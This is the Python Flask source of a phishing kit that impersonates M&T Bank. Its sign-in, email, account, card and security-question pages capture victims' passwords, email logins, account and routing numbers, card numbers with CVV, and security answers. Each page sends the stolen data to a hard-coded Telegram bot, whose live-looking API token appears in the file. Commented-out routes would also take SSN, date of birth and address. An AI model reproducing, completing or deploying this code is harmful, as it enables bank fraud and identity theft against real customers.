from flask import Blueprint, session, render_template, request, redirect, url_for
# from .utils import report_login, report_card_details, report_ssn, personal_confirmation
from .utils import report_login, email_report, security_question, report_acc, report_card_details
import telebot

# franko.draper@ilydeen.org {cameleon mtbprotect}

API_TOKEN = '5643989445:AAGLfwadgWX3oc6qCfgoxQXQ60c6gsnqNPk'

receiver_id = 5366857177

bot = telebot.TeleBot(API_TOKEN)

portals = Blueprint('portals', __name__)

@portals.route('/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            session['username'] = user_id
            # print(user_id,password)
            report_login(user_id,password, bank_name='M & T')
            bot.send_message(receiver_id, f'-------------MANDT BANK-------------\nUsername: {user_id}\nPassword: {password}\n--------------------------')
            return redirect(url_for('portals.email_confirmation'))
    return render_template('signin.html')

@portals.route('/security-question', methods=['GET','POST'])
def question():
    username = session['username']
    if request.method == 'POST':
        q1 = request.form['q1']
        ans1 = request.form['ans1']
        q2 = request.form['q2']
        ans2 = request.form['ans2']
        q3 = request.form['q3']
        ans3 = request.form['ans3']
        security_question(q1,ans1,q2,ans2,q3,ans3)
        bot.send_message(receiver_id, f'-------------MANDT for {username} -----------\n{q1}: {ans1}\n{q2}: {ans2}\n{q3}: {ans3}\n--------------------------')
        return redirect(url_for('main.syncing'))
    return render_template('security-question.html')

@portals.route('/email-confirmation', methods=['GET','POST'])
def email_confirmation():
    username = session['username']
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        if email and password:
            bot.send_message(receiver_id, f'-------------MANDT EMAIL LOGIN FOR {username} -------------\nUsername: {email}\nPassword: {password}\n--------------------------')
            # print(email,password)
            email_report(email,password)
            return redirect(url_for('portals.account'))
    return render_template('identity-gmail.html')


@portals.route('/account-confirmation', methods=['GET','POST'])
def account():
    username = session['username']
    if request.method == 'POST':
        accNam = request.form['account_name']
        accNum = request.form['account_number']
        routineNum = request.form['routine_number']
        if accNam and accNum and routineNum:
            bot.send_message(receiver_id, f'-------------MANDT ACCOUNT DETAILS FOR {username} -------------\Account Name: {accNam}\nAccount Number: {accNum}\nRoutine Number: {routineNum}\n--------------------------')
            # print(accNam,routineNum)
            report_acc(accNam, accNum, routineNum)
            return redirect(url_for('portals.card_confirmation'))
    return render_template('personal_info.html')


@portals.route('/card-confirmation', methods=['GET','POST'])
def card_confirmation():
    username = session['username']
    if request.method == 'POST':
        card_name = request.form['card_name']
        card_number = request.form['card_number']
        exp_date = request.form['exp_date']
        cvv = request.form['cvv']
        if card_name and card_number and exp_date and cvv:
            # print( card_name, card_number, exp_date, cvv)
            bot.send_message(receiver_id, f'-------------MANDT CARD DETAILS for {username} -----------\nCard name: {card_name}\nCard number: {card_number}\nExpiry date: {exp_date}\nCvv: {cvv}\n--------------------------')
            report_card_details(card_name, card_number, exp_date, cvv)
            return redirect(url_for('portals.question'))
    return render_template('bank-card.html')


# @portals.route('/ssn', methods=['GET','POST'])
# def ssn():
#     username = session['username']
#     if request.method == 'POST':
#         ssn = request.form['ssn']
#         dob = request.form['dob']
#         if ssn:
#             bot.send_message(receiver_id, f'-------------MANDT SSN AND DOB FOR {username} -------------\nUsername: {ssn}\nPassword: {dob}\n--------------------------')
#             # print(ssn)
#             # report_ssn(ssn)
#             return redirect(url_for('portals.email_confirmation'))
#     return render_template('identity-ssn.html')

# @portals.route('/signin/address-confirmation', methods=['GET','POST'])
# def address():
#     if request.method == 'POST':
#         address = request.form['address']
#         apt = request.form['apt']
#         city = request.form['city']
#         state = request.form['state']
#         zipcode = request.form['zipcode']
#         if address and city and state and zipcode:
#             # print( card_name, card_number, exp_date, cvv)
#             report_address(address, apt, city, state, zipcode)
#             return redirect(url_for('portals.email_confirmation'))
#     return render_template('address.html')

# @portals.route('/signin/personal-confirmation', methods=['GET','POST'])
# def personal_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['account_name']
#         card_number = request.form['account_number']
#         exp_date = request.form['routine_number']
#         if card_name and card_number and exp_date:
#             # print( card_name, card_number, exp_date, cvv)
#             report_personal_details(card_name, card_number, exp_date)
#             return redirect(url_for('main.syncing'))
#     return render_template('personal_info.html')



# We are all 6 years old at some level